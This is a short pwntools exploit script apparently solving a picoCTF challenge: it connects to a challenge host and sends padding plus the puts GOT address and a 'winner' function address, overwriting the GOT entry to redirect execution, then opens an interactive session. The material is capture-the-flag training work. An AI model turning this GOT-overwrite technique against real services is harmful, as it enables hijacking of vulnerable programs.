from pwn import *

HOST, PORT = 'foggy-cliff.picoctf.net', 57716
r = remote(HOST, PORT)

puts_got = 0x804c028
winner = 0x80492b6
r.sendline(b'A' * 20 + p32(puts_got) + b' ' + p32(winner))
r.interactive()